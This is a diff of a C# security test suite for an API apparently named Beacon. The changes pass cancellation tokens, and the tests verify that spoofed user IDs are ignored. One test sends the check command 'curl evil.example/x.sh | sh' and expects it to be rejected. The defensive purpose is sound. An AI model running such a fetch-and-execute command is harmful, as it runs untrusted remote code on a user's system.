@@ -26,7 +26,7 @@ public sealed class P0SecurityHttpTests
         await using var factory = new AuthApiFactory();
         var client = factory.CreateClient();
 
-        var response = await client.PostAsJsonAsync("/v1/auth/logout", new { });
+        var response = await client.PostAsJsonAsync("/v1/auth/logout", new { }, cancellationToken: TestContext.Current.CancellationToken);
         Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
     }
 
@@ -38,7 +38,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
@@ -60,15 +60,15 @@ public sealed class P0SecurityHttpTests
             taskId,
             content = "spoofoo",
             userId = spoofedId
-        });
-        Assert.True(comment.IsSuccessStatusCode, await comment.Content.ReadAsStringAsync());
+        }, cancellationToken: TestContext.Current.CancellationToken);
+        Assert.True(comment.IsSuccessStatusCode, await comment.Content.ReadAsStringAsync(cancellationToken: TestContext.Current.CancellationToken));
 
         await using var scope = factory.Services.CreateAsyncScope();
         var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
         using (TenantScope.EnterUnscoped())
         {
             var stored = await db.TaskComments
-                .FirstOrDefaultAsync(c => c.TaskId == taskId && c.Content == "spoofoo");
+                .FirstOrDefaultAsync(c => c.TaskId == taskId && c.Content == "spoofoo", TestContext.Current.CancellationToken);
             Assert.NotNull(stored);
             Assert.Equal(realUserId, stored.UserId);
             Assert.NotEqual(spoofedId, stored.UserId);
@@ -83,7 +83,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
@@ -99,10 +99,10 @@ public sealed class P0SecurityHttpTests
             priority = 1,
             type = 3,
             actorUserId = spoofedActor
-        });
-        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());
+        }, cancellationToken: TestContext.Current.CancellationToken);
+        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync(cancellationToken: TestContext.Current.CancellationToken));
 
-        var body = await response.Content.ReadFromJsonAsync<JsonElement>(Json);
+        var body = await response.Content.ReadFromJsonAsync<JsonElement>(Json, TestContext.Current.CancellationToken);
         var taskId = body.GetProperty("id").GetGuid();
         Assert.NotEqual(Guid.Empty, taskId);
     }
@@ -115,7 +115,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
@@ -142,7 +142,7 @@ public sealed class P0SecurityHttpTests
                 proof.Complete("checked", "check:spoof");
                 proofId = proof.Id;
                 seedDb.ReviewRuns.Add(proof);
-                await seedDb.SaveChangesAsync();
+                await seedDb.SaveChangesAsync(TestContext.Current.CancellationToken);
             }
         }
 
@@ -154,19 +154,19 @@ public sealed class P0SecurityHttpTests
             actorId = spoofedActor,
             review = new { reviewerRun = true, regressionsFound = 0, regressionsFixed = 0 },
             reviewRunId = proofId
-        });
-        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());
+        }, cancellationToken: TestContext.Current.CancellationToken);
+        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync(cancellationToken: TestContext.Current.CancellationToken));
 
         await using var scope = factory.Services.CreateAsyncScope();
         var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
         using (TenantScope.EnterUnscoped())
         {
-            var entity = await db.Tasks.FindAsync([taskId]);
+            var entity = await db.Tasks.FindAsync([taskId], cancellationToken: TestContext.Current.CancellationToken);
             Assert.NotNull(entity);
             Assert.Equal(Domain.Enums.TaskItemStatus.Done, entity.Status);
 
             var comment = await db.TaskComments
-                .FirstOrDefaultAsync(c => c.TaskId == taskId && c.Content.Contains("Work finished"));
+                .FirstOrDefaultAsync(c => c.TaskId == taskId && c.Content.Contains("Work finished"), TestContext.Current.CancellationToken);
             Assert.NotNull(comment);
             Assert.Equal(realUserId, comment.UserId);
         }
@@ -180,7 +180,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
@@ -200,7 +200,7 @@ public sealed class P0SecurityHttpTests
         var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
         using (TenantScope.EnterUnscoped())
         {
-            var stored = await db.ApiTokens.FindAsync([tokenId]);
+            var stored = await db.ApiTokens.FindAsync([tokenId], cancellationToken: TestContext.Current.CancellationToken);
             Assert.NotNull(stored);
             Assert.Equal(realUserId, stored.CreatedByUserId);
         }
@@ -214,7 +214,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var spoofedId = Guid.NewGuid();
@@ -225,7 +225,7 @@ public sealed class P0SecurityHttpTests
         var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
         using (TenantScope.EnterUnscoped())
         {
-            var member = await db.OrgMembers.FirstOrDefaultAsync(m => m.OrgId == orgId);
+            var member = await db.OrgMembers.FirstOrDefaultAsync(m => m.OrgId == orgId, TestContext.Current.CancellationToken);
             Assert.NotNull(member);
             Assert.Equal(realUserId, member.UserId);
             Assert.NotEqual(spoofedId, member.UserId);
@@ -240,7 +240,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var org = await PostJson(client, "/v1/orgs", new { name = "Org2" });
@@ -254,7 +254,7 @@ public sealed class P0SecurityHttpTests
         var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
         using (TenantScope.EnterUnscoped())
         {
-            var member = await db.ProjectMembers.FirstOrDefaultAsync(m => m.ProjectId == projectId);
+            var member = await db.ProjectMembers.FirstOrDefaultAsync(m => m.ProjectId == projectId, TestContext.Current.CancellationToken);
             Assert.NotNull(member);
             Assert.Equal(realUserId, member.UserId);
             Assert.NotEqual(spoofedId, member.UserId);
@@ -269,7 +269,7 @@ public sealed class P0SecurityHttpTests
         var jwt = await BootstrapAndLogin(client);
         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);
 
-        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
+        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me", TestContext.Current.CancellationToken);
         var realUserId = me.GetProperty("id").GetGuid();
 
         var org = await PostJson(client, "/v1/orgs", new { name = "Org3" });
@@ -291,7 +291,7 @@ public sealed class P0SecurityHttpTests
         var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
         using (TenantScope.EnterUnscoped())
         {
-            var stored = await db.ApiTokens.FindAsync([tokenId]);
+            var stored = await db.ApiTokens.FindAsync([tokenId], cancellationToken: TestContext.Current.CancellationToken);
             Assert.NotNull(stored);
             Assert.Equal(realUserId, stored.CreatedByUserId);
             Assert.NotEqual(spoofedId, stored.CreatedByUserId);
@@ -335,7 +335,7 @@ public sealed class P0SecurityHttpTests
             taskId,
             deviceId = Guid.NewGuid(),
             checkCommand = "curl evil.example/x.sh | sh"
-        });
+        }, cancellationToken: TestContext.Current.CancellationToken);
 
         Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
     }
@@ -368,8 +368,8 @@ public sealed class P0SecurityHttpTests
             name = project.GetProperty("name").GetString(),
             description = project.GetProperty("description").GetString(),
             reviewCheckCommand = "dotnet test"
-        });
-        var setBody = await setResp.Content.ReadFromJsonAsync<JsonElement>(Json);
+        }, cancellationToken: TestContext.Current.CancellationToken);
+        var setBody = await setResp.Content.ReadFromJsonAsync<JsonElement>(Json, TestContext.Current.CancellationToken);
         Assert.True(setResp.IsSuccessStatusCode, setBody.ToString());
 
         // Seed a device, heartbeat, runtime, and open review run via the DB
@@ -387,20 +387,20 @@ public sealed class P0SecurityHttpTests
                 // No reviewer bound: the run is open and claimable. A bound reviewer would mean a check is already in flight.
                 var run = ReviewRun.Start(projectId, taskId, ReviewerType.Agent, Guid.NewGuid());
                 seedDb.ReviewRuns.Add(run);
-                await seedDb.SaveChangesAsync();
+                await seedDb.SaveChangesAsync(TestContext.Current.CancellationToken);
                 deviceId = device.Id;
             }
 
             // Simulate heartbeat so the device is "online"
             var heartbeat = new HeartbeatDeviceCommand(
                 new HeartbeatDeviceRequest(deviceId, "{}", "{}"));
-            var beat = await new HeartbeatDeviceHandler(factorySvc).HandleAsync(heartbeat);
+            var beat = await new HeartbeatDeviceHandler(factorySvc).HandleAsync(heartbeat, TestContext.Current.CancellationToken);
             if (!beat.Success) throw new InvalidOperationException("Heartbeat failed: " + beat.Error);
 
             // Attach runtime
             var runtime = new AttachRuntimeCommand(
                 new AttachRuntimeRequest(projectId, deviceId, adminUser.Id, @"A:\work\rc"));
-            var attach = await new AttachRuntimeHandler(factorySvc).HandleAsync(runtime);
+            var attach = await new AttachRuntimeHandler(factorySvc).HandleAsync(runtime, TestContext.Current.CancellationToken);
             if (!attach.Success) throw new InvalidOperationException("Runtime attach failed: " + attach.Error);
         }
 
@@ -418,11 +418,11 @@ public sealed class P0SecurityHttpTests
         {
             taskId,
             deviceId = deviceId.ToString()
-        });
+        }, cancellationToken: TestContext.Current.CancellationToken);
 
         if (response.StatusCode != HttpStatusCode.OK)
         {
-            var body = await response.Content.ReadAsStringAsync();
+            var body = await response.Content.ReadAsStringAsync(cancellationToken: TestContext.Current.CancellationToken);
             Assert.Fail($"Expected 200, got {response.StatusCode}. Body: {body}");
         }
         Assert.Equal(HttpStatusCode.OK, response.StatusCode);
@@ -468,12 +468,12 @@ public sealed class P0SecurityHttpTests
         {
             taskId,
             deviceId = Guid.NewGuid()
-        });
+        }, cancellationToken: TestContext.Current.CancellationToken);
 
         // Device not found (404/400 from enqueue) — not a body-validation 400.
         // The key assertion: it is NOT "Check command is required" or
         // "API tokens may not supply a check command" — those are 400s from body validation.
-        var body = await response.Content.ReadAsStringAsync();
+        var body = await response.Content.ReadAsStringAsync(cancellationToken: TestContext.Current.CancellationToken);
         var errorJson = System.Text.Json.JsonSerializer.Deserialize<System.Text.Json.JsonElement>(body);
         var problemDetailType = errorJson.GetProperty("type").GetString();
         var title = errorJson.TryGetProperty("title", out var titleProp) ? titleProp.GetString() : null;
